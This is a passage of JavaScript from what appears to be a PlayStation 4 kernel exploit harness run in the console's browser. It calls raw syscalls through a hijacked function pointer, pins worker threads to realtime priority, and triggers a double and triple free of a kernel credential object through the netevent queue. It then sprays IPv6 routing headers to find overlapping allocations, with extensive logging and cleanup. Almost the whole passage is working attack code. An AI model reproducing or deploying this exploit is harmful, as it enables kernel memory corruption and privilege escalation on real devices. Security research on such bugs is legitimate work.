            prioDv.setUint16(2, savedPrio[1], true);
            const pr = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;

            new Uint8Array(maskAb).fill(0);
            sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
                ID, 0x10, maskAddr);
            const backMask = new int64(maskDv.getUint32(0, true),
                                       maskDv.getUint32(4, true));
            prioDv.setUint16(0, 0xffff, true);
            prioDv.setUint16(2, 0xffff, true);
            sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioAddr);
            const backPrio = [prioDv.getUint16(0, true), prioDv.getUint16(2, true)];
            const good = backMask.low === savedMask.low
                && backMask.hi === savedMask.hi
                && backPrio[0] === savedPrio[0] && backPrio[1] === savedPrio[1];
            mark("THREAD-ATTRS-RESTORED", "at=" + why + " affinity=" + ar
                + " rtprio=" + pr + " mask=" + backMask
                + " prio={" + backPrio + "}");
            check("thread-attrs-restored-power-off-safe", good, "");

            let wr = 0, wn = 0;
            for (const w of workers) {
                try {
                    if (!w.armed) continue;
                    wn++;
                    new Uint8Array(maskAb).fill(0xff);
                    await fireW(w, SYS.cpuset_setaffinity,
                        [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID, 0x10, maskAddr], 3000);
                    prioDv.setUint16(0, RTP_PRIO_NORMAL, true);
                    prioDv.setUint16(2, 0, true);
                    await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr], 3000);
                    wr++;
                } catch (e) { }
            }
            mark("WORKER-ATTRS-RESTORED", "at=" + why + " n=" + wr + "/" + wn);
        }

        restoreCtx = { restore: restoreThreadAttrs };
        mark("THREAD-ATTRS-SAVED", "mask=" + savedMask
            + " rtprio={" + savedPrio + "}");

        function fireW(w, num, args, timeoutMs) {
            layout(w.ctx, stubAddr.get(num), args);
            return w.rpc("fire", timeoutMs === undefined ? 3000 : timeoutMs,
                w.ctx.S.low, w.ctx.S.hi);
        }

        if (CFG_USE_REALTIME === 1) {
            mark("REALTIME-ENABLED", "pinning workers then main");
            prioDv.setUint16(0, RTP_PRIO_REALTIME, true);
            prioDv.setUint16(2, RTP, true);
            new Uint8Array(maskAb).fill(0);
            maskDv.setUint32(0, 1 << MAIN_CORE, true);

            let pinned = 0;
            for (const w of workers) {
                try {
                    mark("WORKER-PIN-BEGIN", w.name);
                    await fireW(w, SYS.cpuset_setaffinity, [CPU_LEVEL_WHICH, CPU_WHICH_TID,
                        new int64(0xffffffff, 0xffffffff), 0x10, maskAddr], 3000);
                    mark("WORKER-PIN-AFFINITY", w.name + " ok");
                    await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr], 3000);
                    mark("WORKER-PIN-RTPRIO", w.name + " ok");
                    pinned++;
                } catch (pinErr) {
                    mark("WORKER-PIN-FAILED", w.name + " threw: "
                        + (pinErr && pinErr.message ? pinErr.message : String(pinErr)));
                    try { if (w.armed) { await w.rpc("disarm", 2000); w.armed = false; } } catch (_) {}
                    try { w.worker.terminate(); } catch (_) {}
                }
            }
            const liveWorkers = workers.filter(w => w.armed && w.wired);
            workers.length = 0;
            for (const w of liveWorkers) workers.push(w);
            if (workers.length < 1) {
                mark("TOO-FEW-WORKERS-PINNED", workers.length + "/1 -- aborting");
                state("WORKERS FAILED TO PIN -- reboot", "bad");
                return;
            }
            mark("WORKERS-PINNED", "n=" + workers.length + " core=" + MAIN_CORE
                + " rtp=" + RTP);

            const a = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
                new int64(0xffffffff, 0xffffffff), 0x10, maskAddr).i32;
            const r = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;
            check("main-thread-pinned-realtime", a === 0 && r === 0,
                "core=" + MAIN_CORE + " rtp=" + RTP
                + " affinity=" + a + " rtprio=" + r);
        } else {
            mark("REALTIME-SKIPPED", "CFG_USE_REALTIME=0 -- default priority");
        }

        function tagFor(i) { return (RTHDR_TAG | (i & 0xffff)) >>> 0; }
        function readTag() {
            const v = leakDv.getUint32(4, true) >>> 0;
            return { ok: (v & 0xffff0000) >>> 0 === RTHDR_TAG, idx: v & 0xffff };
        }
        const sprayOk = new Array(NUM_IPV6_SOCK).fill(false);
        function findTwins(timeout) {
            for (let round = 0; round < timeout; ++round) {
                for (let i = 0; i < ipv6.length; ++i) {
                    if (burned.has(ipv6[i])) { sprayOk[i] = false; continue; }
                    sprayDv.setUint32(4, tagFor(i), true);
                    sprayOk[i] = setRthdr(ipv6[i]) === 0;
                }
                for (let i = 0; i < ipv6.length; ++i) {
                    if (R2_ON && !sprayOk[i]) continue;
                    if (getRthdr(ipv6[i], IP6_RTHDR0_SIZE, 8) < 0) continue;
                    const t = readTag();
                    if (t.ok && t.idx !== i && t.idx < ipv6.length
                        && (!R2_ON || sprayOk[t.idx]))
                        return { a: ipv6[i], b: ipv6[t.idx], round: round };
                }
                if ((round + 1) % 50 === 0) sc(SYS.sched_yield);
            }
            return null;
        }

        function findTriplet(master, slave, tag, timeout) {
            const baseRounds = timeout || MAX_ROUNDS_TRIPLET;
            let rounds = baseRounds;
            let backoff = 0;
            while (backoff < 3) {
                const result = findTripletOnce(master, slave, tag, rounds);
                if (result) return result;
                backoff++;
                rounds = Math.min(rounds * 2, 2000);
                nanosleepMs(1);
            }
            return null;
        }

        function findTripletOnce(master, slave, tag, timeout) {
            const rounds = timeout || MAX_ROUNDS_TRIPLET;
            const seen = [];
            let untagged = 0;
            for (let round = 0; round < rounds; ++round) {
                for (let i = 0; i < ipv6.length; ++i) {
                    if (ipv6[i] === master || ipv6[i] === slave) continue;
                    if (burned.has(ipv6[i])) continue;
                    sprayDv.setUint32(4, tagFor(i), true);
                    setRthdr(ipv6[i]);
                }
                const t = getRthdr(master, IP6_RTHDR0_SIZE, 8) < 0
                    ? { ok: false, idx: 0 } : readTag();
                if (!t.ok) untagged++;
                const fd = (t.ok && t.idx < ipv6.length) ? ipv6[t.idx] : -1;
                if (seen.length < 6)
                    seen.push((t.ok ? t.idx + "->fd" + fd : "untagged"));
                if (fd !== -1 && fd !== master && fd !== slave
                    && !burned.has(fd)) {
                    (/^(RE|UW)/.test(tag) ? trace : mark)
                        ("TRIPLET-" + tag, "round=" + round + " fd=" + fd
                         + " untagged=" + untagged);
                    return fd;
                }
                if ((round + 1) % 100 === 0) sc(SYS.sched_yield);
            }
            mark("TRIPLET-" + tag + "-MISS", "master=" + master + " slave="
                + slave + " rounds=" + rounds + " untagged=" + untagged
                + "  first reads: " + seen.join(" "));
            return 0;
        }

        let bootErr = "";
        function bootFingerprint() {
            const nameAb = new ArrayBuffer(8), outAb = new ArrayBuffer(0x10);
            keepAlive.push(nameAb, outAb);
            const nameAddr = bufAddr(nameAb), outAddr = bufAddr(outAb);
            const nameDv = new DataView(nameAb);
            new Uint8Array(outAb).fill(0);
            const trials = [[1, 21], [1, 10], [1, 11]];
            for (const t of trials) {
                nameDv.setUint32(0, t[0], true);
                nameDv.setUint32(4, t[1], true);
                lenDv.setUint32(0, 0x10, true);
                lenDv.setUint32(4, 0, true);
                const rv = sc(SYS.sysctl, nameAddr, 2, outAddr, lenAddr, 0, 0).i32;
                const gotLen = lenDv.getUint32(0, true);
                if (rv === 0 && gotLen > 0) {
                    const o = new DataView(outAb);
                    const sec = o.getUint32(0, true);
                    if (sec !== 0) {
                        return t[0] + "," + t[1] + ":" + sec.toString(16)
                            + ":" + o.getUint32(8, true).toString(16);
                    }
                    let h = 0;
                    for (let i = 0; i < 8; ++i)
                        h = ((h << 8) ^ o.getUint8(i)) >>> 0;
                    return t[0] + "," + t[1] + ":h" + h.toString(16);
                }
                bootErr = "t=" + t[0] + "," + t[1] + " rv=" + rv
                    + " errno=" + errno() + " oldlen=" + gotLen;
            }
            return null;
        }
        const boot = bootFingerprint();
        mark("BOOT", boot || bootErr);
        let lastCommitted = null;
        try { lastCommitted = localStorage.getItem("ps4lab_committed_boot"); }
        catch (e) { }
        if (boot && lastCommitted === boot && params.get("force") !== "1") {
            mark("REFUSING-TO-ARM", "reason=not-rebooted-since-last-committed-run");
            check("console-rebooted-since-last-committed", false,
                "boot=" + boot + " last=" + lastCommitted + " override=?force=1");
            state("REBOOT FIRST -- this kernel is still poisoned", "bad");
            return;
        }
        check("console-rebooted-since-last-committed", true,
            "boot=" + (boot || "none") + " last=" + (lastCommitted || "none"));

        let twins = null, triplets = null;
        let uncontained = null;
        for (let attempt = 1; attempt <= NUM_ATTEMPT && !triplets; ++attempt) {
            if (uncontained) {
                mark("NO-RETRY-UNCONTAINED", "attempt=" + attempt
                    + " reason=" + uncontained);
                break;
            }
            state("attempt " + attempt + "...", "warn");
            mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT);
            try {
                const dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                if (dummy === -1) { mark("ATTEMPT-SKIP", "socket failed"); continue; }
                const reg = netevent(dummy, NETEVENT_SET_QUEUE);
                if (reg.rv === -1) {
                    mark("ATTEMPT-SKIP", "SET_QUEUE rv=-1 errno=" + reg.err);
                    sc(SYS.close, dummy); continue;
                }

                sc(SYS.close, dummy);
                sc(SYS.setuid, 1);
                uafSock = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                if (uafSock !== dummy) {
                    mark("ATTEMPT-SKIP", "fd not reclaimed: wanted " + dummy
                        + " got " + uafSock);
                    if (uafSock !== -1) sc(SYS.close, uafSock);
                    uafSock = 0;
                    continue;
                }
                sc(SYS.setuid, 1);
                const clr = netevent(uafSock, NETEVENT_CLEAR_QUEUE);
                mark("UAF-ARMED", "fd=" + uafSock + " clear_rv=" + clr.rv);
                committed = true;

                // *** DEBUG: verificar tabla SYS antes de usar sendmsg ***
                mark("PRE-SENDMSG", "sendmsg=" + SYS.sendmsg
                    + " dup=" + SYS.dup + " close=" + SYS.close
                    + " uafSock=" + uafSock);
                if (typeof SYS.sendmsg !== "number" || typeof SYS.dup !== "number") {
                    mark("SYS-TABLE-BROKEN", "sendmsg=" + SYS.sendmsg
                        + " dup=" + SYS.dup + " -- aborting intento");
                    if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
                    continue;
                }

                try { if (boot) localStorage.setItem("ps4lab_committed_boot", boot); }
                catch (e) { }

                for (let i = 0; i < 0x80; ++i) sc(SYS.sendmsg, 0, msgAddr, 0);

                if (STOP_BEFORE_DOUBLE) {
                    mark("STOP-BEFORE-DOUBLE", "withheld=dup+close");
                    rebootRequired = true;
                    break;
                }

                const d1 = sc(SYS.dup, uafSock).i32;
                if (d1 === -1) { mark("ATTEMPT-SKIP", "dup failed"); rebootRequired = true; continue; }
                nanosleepMs(MS_DELAY);
                sc(SYS.close, d1);
                rebootRequired = true;
                mark("DOUBLE-FREE", "dup=" + d1 + " closed");

                twins = findTwins(MAX_ROUNDS_TWIN);
                if (!twins) {
                    if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
                    mark("ATTEMPT-RETRY", "after=no-twins next="
                        + (attempt + 1) + "/" + NUM_ATTEMPT);
                    continue;
                }
                mark("TWINS", "a=" + twins.a + " b=" + twins.b
                    + " round=" + twins.round);

                freeRthdr(twins.b);
                let reclaimed = false, rounds = 0;

                function fireTracked(w) {
                    const t = fireW(w, SYS.recvmsg, [iovSs[0], msgAddr, 0], 0);
                    t.settled = false;
                    t.then(() => { t.settled = true; }, () => { t.settled = true; });
                    return t;
                }
                const tasks = new Array(iovWorkers.length);
                let parkedSeen = -1;
                for (let i = 0; i < NUM_IOV_SPRAY && !reclaimed; ++i) {
                    rounds = i + 1;
                    for (let k = 0; k < iovWorkers.length; ++k) tasks[k] = fireTracked(iovWorkers[k]);
                    sc(SYS.sched_yield);
                    if (parkedSeen < 0) {
                        await new Promise(r => setTimeout(r, 0));
                        parkedSeen = tasks.filter(t => !t.settled).length;
                        mark("IOV-PARKED", parkedSeen + "/" + iovWorkers.length);
                    }
                    if (getRthdr(twins.a, IP6_RTHDR0_SIZE, 8) >= 0
                        && leakDv.getInt32(0, true) === 1) { reclaimed = true; break; }

                    for (let k = 0; k < iovWorkers.length; ++k)
                        sc(SYS.write, iovSs[1], scratch, 1);
                    await Promise.all(tasks);
                    for (let k = 0; k < iovWorkers.length; ++k)
                        sc(SYS.read, iovSs[0], scratch, 1);
                }
                const rets = tasks.map(function (t, k) {
                    return iovWorkers[k].ctx.frameDv.getInt32(0, true);
                });
                mark("IOV-RETS", "rounds=" + rounds + " recvmsg_rv=" + rets.join(","));
                check("cr_refcnt-driven-1", reclaimed,
                    "rounds=" + rounds + " parked=" + parkedSeen + "/" + iovWorkers.length);

                if (!reclaimed) {
                    for (let k = 0; k < iovWorkers.length; ++k)
                        sc(SYS.write, iovSs[1], scratch, 1);
                    await Promise.all(tasks);
                    for (let k = 0; k < iovWorkers.length; ++k)
                        sc(SYS.read, iovSs[0], scratch, 1);
                    burn(twins.a, "refcount-drive");
                    burn(twins.b, "refcount-drive");
                    twins = null;
                    if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
                    mark("ATTEMPT-RETRY", "after=refcount-drive burned="
                        + burned.size + " next=" + (attempt + 1) + "/" + NUM_ATTEMPT);
                    continue;
                }

                const d2 = sc(SYS.dup, uafSock).i32;
                if (d2 === -1) { mark("ATTEMPT-SKIP", "second dup failed"); break; }
                sc(SYS.close, d2);
                mark("TRIPLE-FREE", "dup=" + d2 + " closed");

                const t0 = twins.a;
                const ptOk = getRthdr(t0, IP6_RTHDR0_SIZE, 8) >= 0;
                mark("POST-TRIPLE", "master=" + t0 + " twin=" + twins.b
                    + " idx=" + (ptOk ? leakDv.getInt32(4, true) : "readfail")
                    + " refcnt=" + (ptOk ? leakDv.getInt32(0, true) : "readfail"));
                const t1 = findTriplet(t0, -1, "T1", MAX_ROUNDS_TRIPLET);

                for (let k = 0; k < iovWorkers.length; ++k)
                    sc(SYS.write, iovSs[1], scratch, 1);
                await Promise.all(tasks);
                for (let k = 0; k < iovWorkers.length; ++k)
                    sc(SYS.read, iovSs[0], scratch, 1);
                const rets2 = tasks.map(function (t, k) {
                    return iovWorkers[k].ctx.frameDv.getInt32(0, true);
                });
                const irOk = getRthdr(t0, IP6_RTHDR0_SIZE, 8) >= 0;
                mark("IOV-RELEASED", "recvmsg_rv=" + rets2.join(",")
                    + " master_idx=" + (irOk ? leakDv.getInt32(4, true) : "readfail"));

                const t2 = findTriplet(t0, t1, "T2", MAX_ROUNDS_TRIPLET);
                if (t1 && t2) {
                    triplets = [t0, t1, t2];
                    mark("TRIPLETS", triplets.join(","));
                } else {
                    mark("TRIPLET-MISS", "t1=" + t1 + " t2=" + t2);
                    burn(t0, "triplet-miss");
                    if (t1) burn(t1, "triplet-miss");
                    if (twins && twins.b) burn(twins.b, "triplet-miss");
                    uncontained = "triplet-miss";
                }
            } catch (attemptErr) {
                mark("ATTEMPT-THREW", "attempt=" + attempt + " "
                    + (attemptErr && attemptErr.message
                        ? attemptErr.message : String(attemptErr)));
                twins = null;
                if (uafSock > 0) { try { sc(SYS.close, uafSock); } catch (_) { } uafSock = 0; }
                continue;
            }
        }

        check("ucred-triple-freed", !!triplets,
            triplets ? triplets.join(",") : "");

        mark("STEP10-SUMMARY", "committed=" + committed
            + " reboot=" + rebootRequired
            + " triplets=" + (triplets ? triplets.join(",") : "none"));

        if (!triplets) {
            const stage = !committed ? "not-armed" : "triple-free";
            mark("FAILED-STAGE", "stage=" + stage);
        }

        state(triplets ? "TRIPLE FREE OK -- subir CFG_IOV_WORKERS a 2"
              : committed ? "Sin triple free -- revisar log"
              : "no commit", triplets ? "ok" : "bad");
    } catch (e) {
        mark("STEP10-FAILED", (e && e.message) ? e.message : String(e));
        state("FAILED -- see log", "bad");
    } finally {
        if (uafSock) mark("UAF-SOCK-LEFT-OPEN", "fd=" + uafSock);

        try {
            if (sc) {
                const closeAll = (list, tag) => {
                    if (!list) return;
                    let n = 0;
                    for (const fd of list) {
                        if (typeof fd !== "number" || fd <= 2) continue;
                        try { if (sc(SYS.close, fd).i32 === 0) n++; } catch (_) { }
                    }
                    if (n) mark(tag, "closed=" + n);
                };
                try { closeAll(_ipv6, "IPV6-CLOSED-FALLBACK"); } catch (_) { }
                try { closeAll(_iovSs, "IOVSS-CLOSED-FALLBACK"); } catch (_) { }
                try { closeAll(_uioSs, "UIOSS-CLOSED-FALLBACK"); } catch (_) { }
                try { closeAll(_masterPipe, "MPIPE-CLOSED-FALLBACK"); } catch (_) { }
                try { closeAll(_slavePipe, "SPIPE-CLOSED-FALLBACK"); } catch (_) { }
                try { if (uafSock) { sc(SYS.close, uafSock); uafSock = 0; } } catch (_) { }
            }
        } catch (e) { mark("FD-CLEANUP-FAILED", e.message); }

        try {
            if (restoreCtx) await restoreCtx.restore("finally");
        } catch (e) { mark("THREAD-ATTRS-RESTORE-THREW", e.message); }
        for (const w of workers) {
            try { if (w.armed) { await w.rpc("disarm", 3000); w.armed = false; } }
            catch (e) { mark("DISARM-THREW", w.name + " " + e.message); }
        }
        for (const w of workers) {
            try {
                if (w.wired && w.master && w.origVector && p) {
                    p.write8(w.master.add32(0x10), w.origVector);
                    w.wired = false;
                }
            } catch (e) { }
        }
        for (const w of workers) { try { w.worker.terminate(); } catch (e) { } }
        try {
            if (mainArmed && mainMf && mainOrig && p) {
                p.write8(mainMf, mainOrig);
                mainArmed = false;
                mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
            }
        } catch (e) { mark("DISARM-THREW", e.message); }

        mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
    }
})();